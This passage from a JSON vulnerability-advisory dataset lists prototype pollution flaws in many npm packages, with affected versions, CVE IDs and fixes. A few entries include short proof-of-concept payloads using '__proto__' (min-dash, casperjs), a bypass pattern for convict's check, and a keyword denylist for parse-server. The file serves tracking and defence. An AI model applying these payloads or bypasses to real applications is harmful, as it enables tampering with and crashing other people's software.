      "package": {
         "raw": "convict@6.2.2",
         "name": "convict",
         "version": "6.2.2"
      },
      "id": "GHSA-jjf5-wx3j-3fv7",
      "description": "This affects the package convict before 6.2.3. This is a bypass of [CVE-2022-22143](https://security.snyk.io/vuln/SNYK-JS-CONVICT-2340604). The [fix](https://github.com/mozilla/node-convict/commit/3b86be087d8f14681a9c889d45da7fe3ad9cd880) introduced, relies on the startsWith method and does not prevent the vulnerability: before splitting the path, it checks if it starts with __proto__ or this.constructor.prototype. To bypass this check it's possible to prepend the dangerous paths with any string value followed by a dot, like for example foo.__proto__ or foo.this.constructor.prototype.",
      "summary": "Prototype Pollution in convict",
      "date": "2022-05-14T00:01:09Z",
      "cve": "CVE-2022-21190",
      "year": 2022
   },
   {
      "package": {
         "raw": "sds@4.4.0",
         "name": "sds",
         "version": "4.4.0"
      },
      "id": "GHSA-ph28-wwfj-fv7f",
      "description": "This affects the package sds from 0.0.0. The library could be tricked into adding or modifying properties of the Object.prototype by abusing the set function located in js/set.js. **Note:** This vulnerability derives from an incomplete fix to CVE-2020-7618",
      "summary": "Prototype Pollution in sds",
      "date": "2022-05-14T00:01:08Z",
      "cve": "CVE-2022-25862",
      "year": 2022
   },
   {
      "package": {
         "raw": "dexie@3.0.4",
         "name": "dexie",
         "version": "3.0.4"
      },
      "id": "GHSA-3xgx-r9j4-qw9w",
      "description": "Dexie is a minimalistic wrapper for IndexedDB. The package dexie before 3.2.2, from 4.0.0-alpha.1 and before 4.0.0-alpha.3 are vulnerable to Prototype Pollution in the Dexie.setByKeyPath(obj, keyPath, value) function which does not properly check the keys being set (like __proto__ or constructor). This can allow an attacker to add/modify properties of the Object.prototype leading to prototype pollution vulnerability. **Note:** This vulnerability can occur in multiple ways, for example when modifying a collection with untrusted user input.",
      "summary": "Prototype Pollution in Dexie",
      "date": "2022-05-03T00:00:46Z",
      "cve": "CVE-2022-21189",
      "year": 2022
   },
   {
      "package": {
         "raw": "dset@3.1.1",
         "name": "dset",
         "version": "3.1.1"
      },
      "id": "GHSA-23wx-cgxq-vpwx",
      "description": "All versions of `dset` prior to 3.1.2 are vulnerable to Prototype Pollution via `dset/merge` mode, as the `dset` function checks for prototype pollution by validating if the top-level path contains `__proto__`, `constructor` or `prototype`. By crafting a malicious object, it is possible to bypass this check and achieve prototype pollution.",
      "summary": "Prototype Pollution in dset",
      "date": "2022-05-03T00:00:45Z",
      "cve": "CVE-2022-25645",
      "year": 2022
   },
   {
      "package": {
         "raw": "jsgui-lang-essentials@0.4.3",
         "name": "jsgui-lang-essentials",
         "version": "0.4.3"
      },
      "id": "GHSA-p3pg-64pv-v7jg",
      "description": "All versions of package `jsgui-lang-essentials` are vulnerable to Prototype Pollution due to allowing all `Object` attributes to be altered, including their magical attributes such as `proto`, `constructor` and `prototype`.",
      "summary": "Prototype Pollution in jsgui-lang-essentials",
      "date": "2022-05-03T00:00:44Z",
      "cve": "CVE-2022-25301",
      "year": 2022
   },
   {
      "package": {
         "raw": "convict@6.2.2",
         "name": "convict",
         "version": "6.2.2"
      },
      "id": "GHSA-x2w5-725j-gf2g",
      "description": "### Impact\n\n* An attacker can inject attributes that are used in other components\n* An attacker can override existing attributes with ones that have incompatible type, which may lead to a crash.\n\nThe main use case of Convict is for handling server-side configurations written by the admins owning the servers, and not random users. So it's unlikely that an admin would deliberately sabotage their own server. Still a situation can happen where an admin not knowledgeable about JavaScript could be tricked by an attacker into writing the malicious JavaScript code into some config files.\n\n### Patches\n\nThe problem is patched in `convict@6.2.3`. Users should upgrade to `convict@6.2.3`.\n\n### Workarounds\n\nNo way for users to fix or remediate the vulnerability without upgrading\n\n### References\n\n* https://www.huntr.dev/bounties/1-npm-convict/\n* #384\n* 3b86be087d8f14681a9c889d45da7fe3ad9cd880\n* 1ea0ab19c5208f66509e1c43b0d0f21c1fd29b75\n\n### For more information\n\nIf you have any questions or comments about this advisory: \nadd your question as a comment in #384 \n",
      "summary": "Prototype Pollution in convict",
      "date": "2022-04-20T16:21:03Z",
      "cve": "CVE-2022-22143",
      "year": 2022
   },
   {
      "package": {
         "raw": "madlib-object-utils@0.1.7",
         "name": "madlib-object-utils",
         "version": "0.1.7"
      },
      "id": "GHSA-pfv6-prqm-85q8",
      "description": "The package madlib-object-utils before version 0.1.8 is vulnerable to Prototype Pollution via the `setValue` method, as it allows an attacker to merge object prototypes into it. *Note:* This vulnerability derives from an incomplete fix of [CVE-2020-7701](https://security.snyk.io/vuln/SNYK-JS-MADLIBOBJECTUTILS-598676)",
      "summary": "Prototype Pollution in madlib-object-utils",
      "date": "2022-04-16T00:00:26Z",
      "cve": "CVE-2022-24279",
      "year": 2022
   },
   {
      "package": {
         "raw": "nconf@0.11.3",
         "name": "nconf",
         "version": "0.11.3"
      },
      "id": "GHSA-6xwr-q98w-rvg7",
      "description": "nconf before 0.11.4. When using the memory engine, it is possible to store a nested JSON representation of the configuration. The .set() function, that is responsible for setting the configuration properties, is vulnerable to Prototype Pollution. By providing a crafted property, it is possible to modify the properties on the Object.prototype.",
      "summary": "Prototype Pollution in nconf",
      "date": "2022-04-13T00:00:30Z",
      "cve": "CVE-2022-21803",
      "year": 2022
   },
   {
      "package": {
         "raw": "fullpage.js@4.0.1",
         "name": "fullpage.js",
         "version": "4.0.1"
      },
      "id": "GHSA-vpgw-ffh3-648h",
      "description": "fullPage utils are available to developers using window.fp_utils. They can use these utils for their own use-case (other than fullPage) as well. However, one of the utils deepExtend is vulnerable to Prototype Pollution vulnerability.\n\nJavascript is \"prototype\" language which means when a new \"object\" is created, it carries the predefined properties and methods of an \"object\" with itself like toString, constructor etc. By using prototype-pollution vulnerability, an attacker can overwrite/create the property of that \"object\" type. If the victim developer has used that property anywhere in the code, then it will have severe effect on the application.",
      "summary": "Prototype Pollution in fullpage.js",
      "date": "2022-04-12T00:00:38Z",
      "cve": "CVE-2022-1295",
      "year": 2022
   },
   {
      "package": {
         "raw": "async@3.2.1",
         "name": "async",
         "version": "3.2.1"
      },
      "id": "GHSA-fwr7-v2mv-hh25",
      "description": "A vulnerability exists in Async through 3.2.1 for 3.x and through 2.6.3 for 2.x (fixed in 3.2.2 and 2.6.4), which could let a malicious user obtain privileges via the `mapValues()` method.",
      "summary": "Prototype Pollution in async",
      "date": "2022-04-07T00:00:17Z",
      "cve": "CVE-2021-43138",
      "year": 2021
   },
   {
      "package": {
         "raw": "deepmerge-ts@4.0.1",
         "name": "deepmerge-ts",
         "version": "4.0.1"
      },
      "id": "GHSA-r9w3-g83q-m6hq",
      "description": "deepmerge-ts is used to merge 2 or more objects respecting type information. deepmerge-ts is vulnerable to Prototype Pollution via file deepmerge.ts, function defaultMergeRecords(). A fix was released in version 4.0.2. Currently, there is no known workaround.",
      "summary": "Prototype Pollution in deepmerge-ts",
      "date": "2022-04-01T17:26:03Z",
      "cve": "CVE-2022-24802",
      "year": 2022
   },
   {
      "package": {
         "raw": "simple-plist@1.3.0",
         "name": "simple-plist",
         "version": "1.3.0"
      },
      "id": "GHSA-gff7-g5r8-mg8m",
      "description": "simple-plist v1.3.0 was discovered to contain a prototype pollution vulnerability via .parse().",
      "summary": "Prototype Pollution in simple-plist",
      "date": "2022-03-23T00:00:22Z",
      "cve": "CVE-2022-26260",
      "year": 2022
   },
   {
      "package": {
         "raw": "set-in@2.0.1",
         "name": "set-in",
         "version": "2.0.1"
      },
      "id": "GHSA-6956-83fg-5wc5",
      "description": "The package set-in before 2.0.3 is vulnerable to Prototype Pollution via the `setIn` method, as it allows an attacker to merge object prototypes into it. **Note:** This vulnerability derives from an incomplete fix of [CVE-2020-28273](https://security.snyk.io/vuln/SNYK-JS-SETIN-1048049)",
      "summary": "Prototype Pollution in set-in",
      "date": "2022-03-18T00:01:11Z",
      "cve": "CVE-2022-25354",
      "year": 2022
   },
   {
      "package": {
         "raw": "libnested@1.5.1",
         "name": "libnested",
         "version": "1.5.1"
      },
      "id": "GHSA-x5m8-2r8v-8f97",
      "description": "The package libnested before 1.5.2 are vulnerable to Prototype Pollution via the set function in index.js. **Note:** This vulnerability derives from an incomplete fix for [CVE-2020-28283](https://security.snyk.io/vuln/SNYK-JS-LIBNESTED-1054930)",
      "summary": "Prototype Pollution in libnested",
      "date": "2022-03-18T00:01:11Z",
      "cve": "CVE-2022-25352",
      "year": 2022
   },
   {
      "package": {
         "raw": "bodymen@1.1.1",
         "name": "bodymen",
         "version": "1.1.1"
      },
      "id": "GHSA-vhxc-fhm5-qcp9",
      "description": "The package bodymen from 0.0.0 are vulnerable to Prototype Pollution via the handler function which could be tricked into adding or modifying properties of Object.prototype using a __proto__ payload. **Note:** This vulnerability derives from an incomplete fix to [CVE-2019-10792](https://security.snyk.io/vuln/SNYK-JS-BODYMEN-548897)",
      "summary": "Prototype Pollution in bodymen",
      "date": "2022-03-18T00:01:11Z",
      "cve": "CVE-2022-25296",
      "year": 2022
   },
   {
      "package": {
         "raw": "sails@1.5.2",
         "name": "sails",
         "version": "1.5.2"
      },
      "id": "GHSA-8v3j-jfg3-v3fv",
      "description": "Sails.js <= 1.5.2 is vulnerable to Prototype Pollution via controller/load-action-modules.js, function loadActionModules(). A [patch](https://github.com/balderdashy/sails/commit/7c5379a656bb305c958df1dcc2b51a9668830358) is available in the `master` branch of Sails.js's GItHub repository.",
      "summary": "Prototype Pollution in Sails.js",
      "date": "2022-03-18T00:01:11Z",
      "cve": "CVE-2021-44908",
      "year": 2021
   },
   {
      "package": {
         "raw": "minimist@1.2.5",
         "name": "minimist",
         "version": "1.2.5"
      },
      "id": "GHSA-xvch-5gv4-984h",
      "description": "Minimist prior to 1.2.6 and 0.2.4 is vulnerable to Prototype Pollution via file `index.js`, function `setKey()` (lines 69-95).",
      "summary": "Prototype Pollution in minimist",
      "date": "2022-03-18T00:01:09Z",
      "cve": "CVE-2021-44906",
      "year": 2021
   },
   {
      "package": {
         "raw": "parse-server@4.10.6",
         "name": "parse-server",
         "version": "4.10.6"
      },
      "id": "GHSA-p6h4-93qp-jhcm",
      "description": "### Impact\nThis is a Remote Code Execution (RCE) vulnerability in Parse Server. This vulnerability affects Parse Server in the default configuration with MongoDB. The main weakness that leads to RCE is the Prototype Pollution vulnerable code in the file `DatabaseController.js`, so it is likely to affect Postgres and any other database backend as well. This vulnerability has been confirmed on Linux (Ubuntu) and Windows.\n\n### Patches\nUpgrade to Parse Server >=4.10.7. If you are using a prerelease version of Parse Server 5.0 (alpha, beta) we will publish a timely fix for these. However, as a general reminder we do not consider prerelease versions to be suitable for production deployment.\n\nNote that as part of the fix a new security feature scans for sensitive keywords in request data to prevent JavaScript prototype pollution. If such a keyword is found, the request is rejected with HTTP response code `400` and Parse Error `105` (`INVALID_KEY_NAME`). By default these keywords are: `{_bsontype: \"Code\"}`, `constructor`, `__proto__`. If you are using any of these keywords in your request data, you can override the default keywords by setting the new Parse Server option `requestKeywordDenylist` to `[]` and specify your own keywords as needed.\n\n### Workarounds\nAlthough the fix is more broad and includes several aspects of the vulnerability, a quick and targeted fix can be achieved by patching the MongoDB Node.js driver and disable BSON code execution. To apply the patch, add the following code to be executed before starting Parse Server, for example in `index.js`.\n\n```\nconst BSON = require('bson');\n const internalDeserialize = BSON.prototype.deserialize;\n BSON.prototype.deserialize = (buffer, options = Object.create(null), ...others) => {\n   if (options.constructor) {\n     options = Object.assign(Object.create(null), options);\n   }\n   return internalDeserialize(buffer, options, ...others);\n };\n const internalDeserializeStream = BSON.prototype.deserializeStream;\n BSON.prototype.deserializeStream = (\n   data,\n   startIndex,\n   numberOfDocuments,\n   documents,\n   docStartIndex,\n   options = Object.create(null),\n   ...others\n ) => {\n   if (options.constructor) {\n     options = Object.assign(Object.create(null), options);\n   }\n   return internalDeserializeStream(\n     data,\n     startIndex,\n     numberOfDocuments,\n     documents,\n     docStartIndex,\n     options,\n     ...others\n   );\n };\n```\n\n### References\n- Original report on [huntr.dev](https://www.huntr.dev/bounties/ac24b343-e7da-4bc7-ab38-4f4f5cc9d099/)\n",
      "summary": "Command injection in Parse Server through prototype pollution",
      "date": "2022-03-11T23:53:23Z",
      "cve": "CVE-2022-24760",
      "year": 2022
   },
   {
      "package": {
         "raw": "object-extend@0.5.0",
         "name": "object-extend",
         "version": "0.5.0"
      },
      "id": "GHSA-m639-9whg-fw97",
      "description": "The package object-extend from 0.0.0 through 0.5.0 is vulnerable to Prototype Pollution via object-extend.",
      "summary": "Prototype Pollution in object-extend",
      "date": "2022-02-19T00:01:25Z",
      "cve": "CVE-2021-23702",
      "year": 2021
   },
   {
      "package": {
         "raw": "plist@3.0.4",
         "name": "plist",
         "version": "3.0.4"
      },
      "id": "GHSA-4cpg-3vgw-4877",
      "description": "Prototype pollution vulnerability via `.parse()` in Plist allows attackers to cause a Denial of Service (DoS) and may lead to remote code execution.",
      "summary": "Prototype pollution in Plist before 3.0.5 can cause denial of service",
      "date": "2022-02-18T00:00:33Z",
      "cve": "CVE-2022-22912",
      "year": 2022
   },
   {
      "package": {
         "raw": "litespeed.js@0.3.11",
         "name": "litespeed.js",
         "version": "0.3.11"
      },
      "id": "GHSA-v9p9-535w-4285",
      "description": "This affects the package litespeed.js before 0.3.12; the package appwrite/server-ce from 0.12.0 and before 0.12.2, before 0.11.1. When parsing the query string in the getJsonFromUrl function, the key that is set in the result object is not properly sanitized leading to a Prototype Pollution vulnerability.",
      "summary": "Prototype Pollution in litespeed.js and appwrite/server-ce",
      "date": "2022-02-17T00:00:32Z",
      "cve": "CVE-2021-23682",
      "year": 2021
   },
   {
      "package": {
         "raw": "mixme@0.5.0",
         "name": "mixme",
         "version": "0.5.0"
      },
      "id": "GHSA-r5cq-9537-9rpf",
      "description": "Node.js mixme 0.5.0, an attacker can add or alter properties of an object via '__proto__' through the mutate() and merge() functions. The polluted attribute will be directly assigned to every object in the program. This will put the availability of the program at risk causing a potential denial of service (DoS).",
      "summary": "Prototype Pollution in mixme",
      "date": "2022-02-10T23:52:01Z",
      "cve": "CVE-2021-28860",
      "year": 2021
   },
   {
      "package": {
         "raw": "handlebars@4.7.6",
         "name": "handlebars",
         "version": "4.7.6"
      },
      "id": "GHSA-765h-qjxv-5f44",
      "description": "The package handlebars before 4.7.7 are vulnerable to Prototype Pollution when selecting certain compiling options to compile templates coming from an untrusted source.",
      "summary": "Prototype Pollution in handlebars",
      "date": "2022-02-10T23:51:42Z",
      "cve": "CVE-2021-23383",
      "year": 2021
   },
   {
      "package": {
         "raw": "ajv@6.12.2",
         "name": "ajv",
         "version": "6.12.2"
      },
      "id": "GHSA-v88g-cgmw-v5xw",
      "description": "An issue was discovered in ajv.validate() in Ajv (aka Another JSON Schema Validator) 6.12.2. A carefully crafted JSON schema could be provided that allows execution of other code by prototype pollution. (While untrusted schemas are recommended against, the worst case of an untrusted schema should be a denial of service, not execution of code.)",
      "summary": "Prototype Pollution in Ajv",
      "date": "2022-02-10T23:30:59Z",
      "cve": "CVE-2020-15366",
      "year": 2020
   },
   {
      "package": {
         "raw": "js-data@3.0.9",
         "name": "js-data",
         "version": "3.0.9"
      },
      "id": "GHSA-mqgv-67vx-g4m5",
      "description": "All versions of package js-data prior to 3.0.10 are vulnerable to Prototype Pollution via the `deepFillIn` function.",
      "summary": "Prototype Pollution in js-data",
      "date": "2022-02-09T22:45:52Z",
      "cve": "CVE-2020-28442",
      "year": 2020
   },
   {
      "package": {
         "raw": "putil-merge@3.7.0",
         "name": "putil-merge",
         "version": "3.7.0"
      },
      "id": "GHSA-4g77-cvgw-grvw",
      "description": "This affects the package putil-merge before 3.8.0. The merge() function does not check the values passed into the argument. An attacker can supply a malicious value by adjusting the value to include the constructor property. Note: This vulnerability derives from an incomplete fix in https://security.snyk.io/vuln/SNYK-JS-PUTILMERGE-1317077",
      "summary": "Prototype Pollution in putil-merge",
      "date": "2022-02-05T00:00:31Z",
      "cve": "CVE-2021-23470",
      "year": 2021
   },
   {
      "package": {
         "raw": "object-path-set@1.0.1",
         "name": "object-path-set",
         "version": "1.0.1"
      },
      "id": "GHSA-h6pr-c536-6rjg",
      "description": "The package object-path-set before 1.0.2 are vulnerable to Prototype Pollution via the setPath method, as it allows an attacker to merge object prototypes into it. *Note:* This vulnerability derives from an incomplete fix in https://security.snyk.io/vuln/SNYK-JS-OBJECTPATHSET-607908",
      "summary": "Prototype Pollution in object-path-set",
      "date": "2022-02-05T00:00:31Z",
      "cve": "CVE-2021-23507",
      "year": 2021
   },
   {
      "package": {
         "raw": "@strikeentco/set@1.0.1",
         "name": "set",
         "version": "1.0.1",
         "scope": "strikeentco"
      },
      "id": "GHSA-39qv-prmh-x37f",
      "description": "This affects the package @strikeentco/set before 1.0.2. It allows an attacker to cause a denial of service and may lead to remote code execution. **Note:** This vulnerability derives from an incomplete fix in https://security.snyk.io/vuln/SNYK-JS-STRIKEENTCOSET-1038821",
      "summary": "Prototype Pollution in @strikeentco/set",
      "date": "2022-02-05T00:00:26Z",
      "cve": "CVE-2021-23497",
      "year": 2021
   },
   {
      "package": {
         "raw": "keyget@2.4.0",
         "name": "keyget",
         "version": "2.4.0"
      },
      "id": "GHSA-9fp7-4fjm-q3mf",
      "description": "The package keyget from 0.0.0 are vulnerable to Prototype Pollution via the methods set, push, and at which could allow an attacker to cause a denial of service and may lead to remote code execution. **Note:** This vulnerability derives from an incomplete fix to [CVE-2020-28272](https://security.snyk.io/vuln/SNYK-JS-KEYGET-1048048)",
      "summary": "Prototype Pollution in keyget",
      "date": "2022-02-01T00:51:01Z",
      "cve": "CVE-2021-23760",
      "year": 2021
   },
   {
      "package": {
         "raw": "bmoor@0.10.0",
         "name": "bmoor",
         "version": "0.10.0"
      },
      "id": "GHSA-4m8h-h59m-m34j",
      "description": "The package bmoor before 0.10.1 is vulnerable to Prototype Pollution due to missing sanitization in set function. **Note:** This vulnerability derives from an incomplete fix in [CVE-2020-7736](https://security.snyk.io/vuln/SNYK-JS-BMOOR-598664)",
      "summary": "Prototype Pollution in bmoor",
      "date": "2022-02-01T00:50:09Z",
      "cve": "CVE-2021-23558",
      "year": 2021
   },
   {
      "package": {
         "raw": "min-dash@3.8.0",
         "name": "min-dash",
         "version": "3.8.0"
      },
      "id": "GHSA-2m53-83f3-562j",
      "description": "### Impact\n\nThe `set` method is vulnerable to prototype pollution with specially crafted inputs.\n\n```javascript\n// insert the following into poc.js and run node poc,js (after installing the package)\n \nlet parser = require(\"min-dash\");\nparser.set({}, [[\"__proto__\"], \"polluted\"], \"success\");\nconsole.log(polluted);\n```\n\n### Patches\n\n`min-dash>=3.8.1` fix the issue.\n\n### Workarounds\n\nNo workarounds exist for the issue.\n\n### References\n\nClosed via https://github.com/bpmn-io/min-dash/pull/21.\n\n### Credits\n\nCredits to Cristian-Alexandru STAICU who found the vulnerability and to Idan Digmi from the Snyk Security Team who reported the vulnerability to us, responsibly. ",
      "summary": "Prototype pollution in min-dash < 3.8.1",
      "date": "2022-02-01T00:44:35Z",
      "cve": null,
      "year": 2022
   },
   {
      "package": {
         "raw": "cached-path-relative@1.0.2",
         "name": "cached-path-relative",
         "version": "1.0.2"
      },
      "id": "GHSA-wg6g-ppvx-927h",
      "description": "The package cached-path-relative before 1.1.0 is vulnerable to Prototype Pollution via the cache variable that is set as {} instead of Object.create(null) in the cachedPathRelative function, which allows access to the parent prototype properties when the object is used to create the cached relative path. When using the origin path as __proto__, the attribute of the object is accessed instead of a path. **Note:** This vulnerability derives from an incomplete fix in https://security.snyk.io/vuln/SNYK-JS-CACHEDPATHRELATIVE-72573",
      "summary": "Prototype Pollution in cached-path-relative",
      "date": "2022-01-27T14:27:53Z",
      "cve": "CVE-2021-23518",
      "year": 2021
   },
   {
      "package": {
         "raw": "min-dash@3.8.0",
         "name": "min-dash",
         "version": "3.8.0"
      },
      "id": "GHSA-fm93-fhh2-cg2c",
      "description": "The package min-dash before 3.8.1 are vulnerable to Prototype Pollution via the set method due to missing enforcement of key types.",
      "summary": "Prototype Pollution in min-dash",
      "date": "2022-01-27T14:21:53Z",
      "cve": "CVE-2021-23460",
      "year": 2021
   },
   {
      "package": {
         "raw": "realms-shim@1.2.2",
         "name": "realms-shim",
         "version": "1.2.2"
      },
      "id": "GHSA-q4j7-v27r-fgcx",
      "description": "All versions of package realms-shim are vulnerable to Sandbox Bypass via a Prototype Pollution attack vector.",
      "summary": "Prototype Pollution in realms-shim",
      "date": "2022-01-13T15:00:36Z",
      "cve": "CVE-2021-23543",
      "year": 2021
   },
   {
      "package": {
         "raw": "extend2@1.0.0",
         "name": "extend2",
         "version": "1.0.0"
      },
      "id": "GHSA-gjm5-83cw-p3p2",
      "description": "The package extend2 before 1.0.1 are vulnerable to Prototype Pollution via the extend function due to unsafe recursive merge.",
      "summary": "Prototype Pollution in extend2",
      "date": "2022-01-12T22:59:13Z",
      "cve": "CVE-2021-23568",
      "year": 2021
   },
   {
      "package": {
         "raw": "node-forge@0.10.0",
         "name": "node-forge",
         "version": "0.10.0"
      },
      "id": "GHSA-5rrq-pxf6-6jx5",
      "description": "### Impact\nThe `forge.debug` API had a potential prototype pollution issue if called with untrusted input. The API was only used for internal debug purposes in a safe way and never documented or advertised.  It is suspected that uses of this API, if any exist, would likely not have used untrusted inputs in a vulnerable way.\n\n### Patches\nThe `forge.debug` API and related functions were removed in 1.0.0.\n\n### Workarounds\nDon't use the `forge.debug` API directly or indirectly with untrusted input.\n\n### References\n- https://www.huntr.dev/bounties/1-npm-node-forge/\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [forge](https://github.com/digitalbazaar/forge).\n* Email us at support@digitalbazaar.com.",
      "summary": "Prototype Pollution in node-forge debug API.",
      "date": "2022-01-08T00:22:42Z",
      "cve": null,
      "year": 2022
   },
   {
      "package": {
         "raw": "dojo@1.11.13",
         "name": "dojo",
         "version": "1.11.13"
      },
      "id": "GHSA-m8gw-hjpr-rjv7",
      "description": "All versions of package dojo are vulnerable to Prototype Pollution via the setObject function.",
      "summary": "Prototype Pollution in dojo",
      "date": "2022-01-05T15:01:46Z",
      "cve": "CVE-2021-23450",
      "year": 2021
   },
   {
      "package": {
         "raw": "comb@2.0.0",
         "name": "comb",
         "version": "2.0.0"
      },
      "id": "GHSA-vxr4-rxw7-g7v6",
      "description": "All versions of package comb are vulnerable to Prototype Pollution via the `deepMerge()` function.",
      "summary": "Prototype Pollution in comb",
      "date": "2021-12-16T14:30:56Z",
      "cve": "CVE-2021-23561",
      "year": 2021
   },
   {
      "package": {
         "raw": "sey@0.3.0",
         "name": "sey",
         "version": "0.3.0"
      },
      "id": "GHSA-wjpc-cgvw-xx23",
      "description": "All versions of package `sey` are vulnerable to Prototype Pollution via the `deepmerge()` function.",
      "summary": "Prototype Pollution in sey",
      "date": "2021-12-16T14:29:34Z",
      "cve": "CVE-2021-23663",
      "year": 2021
   },
   {
      "package": {
         "raw": "fun-map@3.3.1",
         "name": "fun-map",
         "version": "3.3.1"
      },
      "id": "GHSA-p33m-7w7f-gmj8",
      "description": "fun-map through 3.3.1 is vulnerable to Prototype Pollution. The function assocInM could be tricked into adding or modifying properties of 'Object.prototype' using a '__proto__' payload.",
      "summary": "Uncontrolled Resource Consumption in fun-map",
      "date": "2021-12-10T20:05:07Z",
      "cve": "CVE-2020-7644",
      "year": 2020
   },
   {
      "package": {
         "raw": "ts-nodash@1.2.6",
         "name": "ts-nodash",
         "version": "1.2.6"
      },
      "id": "GHSA-5xjx-4xcm-hpcm",
      "description": "`ts-nodash` before version 1.2.7 is vulnerable to Prototype Pollution via the Merge() function due to lack of validation input.",
      "summary": "Prototype Pollution in ts-nodash",
      "date": "2021-12-10T18:53:42Z",
      "cve": "CVE-2021-23403",
      "year": 2021
   },
   {
      "package": {
         "raw": "object-hierarchy-access@0.32.0",
         "name": "object-hierarchy-access",
         "version": "0.32.0"
      },
      "id": "GHSA-fxwf-45c7-4ppr",
      "description": "Overview:Prototype pollution vulnerability in ‘object-hierarchy-access’ versions 0.2.0 through 0.32.0 allows attacker to cause a denial of service and may lead to remote code execution.",
      "summary": "Prototype pollution in object-hierarchy-access",
      "date": "2021-10-12T16:40:58Z",
      "cve": "CVE-2020-28270",
      "year": 2020
   },
   {
      "package": {
         "raw": "object-path@0.11.7",
         "name": "object-path",
         "version": "0.11.7"
      },
      "id": "GHSA-8v63-cqqc-6r2c",
      "description": "object-path is vulnerable to Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution'). The `del()` function fails to validate which Object properties it deletes. This allows attackers to modify the prototype of Object, causing the modification of default properties like `toString` on all objects.",
      "summary": "Prototype Pollution in object-path",
      "date": "2021-09-20T20:46:43Z",
      "cve": "CVE-2021-3805",
      "year": 2021
   },
   {
      "package": {
         "raw": "zrender@5.2.0",
         "name": "zrender",
         "version": "5.2.0"
      },
      "id": "GHSA-fhv8-fx5f-7fxf",
      "description": "### Impact\nUsing `merge` and `clone` helper methods in the `src/core/util.ts` module will have prototype pollution. It will affect the popular data visualization library Apache ECharts, which is using and exported these two methods directly.\n\n### Patches\n \nIt has been patched in https://github.com/ecomfe/zrender/pull/826. \nUsers should update zrender to `5.2.1`.  and update echarts to `5.2.1` if project is using echarts.\n\n### References\nNA\n\n### For more information\nNA\n",
      "summary": "Prototype Pollution in the merge and clone helper methods",
      "date": "2021-09-20T19:53:15Z",
      "cve": "CVE-2021-39227",
      "year": 2021
   },
   {
      "package": {
         "raw": "mixme@0.5.1",
         "name": "mixme",
         "version": "0.5.1"
      },
      "id": "GHSA-84p7-fh9c-6g8h",
      "description": "### Impact\nWhen copying properties from a source object to a target object, the target object can gain access to certain properties of the source object and modify their content.\n\n### Patches\nThe problem was patch with a more agressive discovery of secured properties to filter out.\n",
      "summary": "Prototype Pollution in mixme",
      "date": "2021-09-20T19:52:24Z",
      "cve": null,
      "year": 2021
   },
   {
      "package": {
         "raw": "body-parser-xml@2.0.2",
         "name": "body-parser-xml",
         "version": "2.0.2"
      },
      "id": "GHSA-2ghc-6v89-pw9j",
      "description": "body-parser-xml is vulnerable to Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution').",
      "summary": "body-parser-xml vulnerable to Prototype Pollution",
      "date": "2021-09-14T20:25:35Z",
      "cve": "CVE-2021-3666",
      "year": 2021
   },
   {
      "package": {
         "raw": "immer@9.0.5",
         "name": "immer",
         "version": "9.0.5"
      },
      "id": "GHSA-c36v-fmgq-m8hx",
      "description": "immer is vulnerable to Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution').",
      "summary": "Prototype Pollution in immer",
      "date": "2021-09-07T22:57:14Z",
      "cve": "CVE-2021-3757",
      "year": 2021
   },
   {
      "package": {
         "raw": "open-graph@0.2.4",
         "name": "open-graph",
         "version": "0.2.4"
      },
      "id": "GHSA-g452-6rfc-vrvx",
      "description": "This affects the package open-graph before 0.2.6. The function parse could be tricked into adding or modifying properties of Object.prototype using a __proto__ or constructor payload.",
      "summary": "Prototype Pollution in open-graph",
      "date": "2021-09-01T18:31:53Z",
      "cve": "CVE-2021-23419",
      "year": 2021
   },
   {
      "package": {
         "raw": "jszip@3.6.0",
         "name": "jszip",
         "version": "3.6.0"
      },
      "id": "GHSA-jg8v-48h5-wgxg",
      "description": "This affects the package jszip before 3.7.0. Crafting a new zip file with filenames set to Object prototype values (e.g `__proto__`, `toString`, etc) results in a returned object with a modified prototype instance.",
      "summary": "jszip Vulnerable to Prototype Pollution",
      "date": "2021-08-10T16:02:18Z",
      "cve": "CVE-2021-23413",
      "year": 2021
   },
   {
      "package": {
         "raw": "jquery-deparam@0.5.3",
         "name": "jquery-deparam",
         "version": "0.5.3"
      },
      "id": "GHSA-xg68-chx2-253g",
      "description": "Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution') in jquery-deparam allows a malicious user to inject properties into Object.prototype.",
      "summary": "Prototype Pollution in jquery-deparam",
      "date": "2021-05-24T19:53:01Z",
      "cve": "CVE-2021-20087",
      "year": 2021
   },
   {
      "package": {
         "raw": "jquery-bbq@1.0.0",
         "name": "jquery-bbq",
         "version": "1.0.0"
      },
      "id": "GHSA-7w8j-85wm-6xfq",
      "description": "Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution') in jquery-bbq 1.2.1 allows a malicious user to inject properties into Object.prototype.",
      "summary": "Prototype Pollution in jquery-bbq",
      "date": "2021-05-24T19:51:58Z",
      "cve": "CVE-2021-20086",
      "year": 2021
   },
   {
      "package": {
         "raw": "casperjs@1.1.4",
         "name": "casperjs",
         "version": "1.1.4"
      },
      "id": "GHSA-vrr3-5r3v-7xfw",
      "description": "### Overview\ncasperjs is a navigation scripting & testing utility for PhantomJS and SlimerJS.\n\nAffected versions of this package are vulnerable to Prototype Pollution via the mergeObjects utility function.\n\n### PoC\n```js\nvar payload = JSON.parse('{\"__proto__\": {\"a\": \"pwned\"}}');\nmergeObjects({}, payload);\nconsole.log({}.a); // prints \"pwned\"\n```",
      "summary": "Improperly Controlled Modification of Dynamically-Determined Object Attributes in casperjs",
      "date": "2021-05-17T21:00:52Z",
      "cve": "CVE-2020-7679",
      "year": 2020
   },
   {
      "package": {
         "raw": "json8@1.0.2",
         "name": "json8",
         "version": "1.0.2"
      },
      "id": "GHSA-7h43-gx24-p529",
      "description": "This affects the package json8 before 1.0.3. The function adds in the target object the property specified in the path, however it does not properly check the key being set, leading to a prototype pollution.",
      "summary": "Prototype pollution in json8",
      "date": "2021-05-10T19:17:05Z",
      "cve": "CVE-2020-7770",
      "year": 2020
   },
   {
      "package": {
         "raw": "grpc@1.24.3",
         "name": "grpc",
         "version": "1.24.3"
      },
      "id": "GHSA-pp75-xfpw-37g9",
      "description": "\"The package grpc before 1.24.4 and the package @grpc/grpc-js before 1.1.8 are vulnerable to Prototype Pollution via loadPackageDefinition.\"",
      "summary": "Prototype pollution in grpc and @grpc/grpc-js",
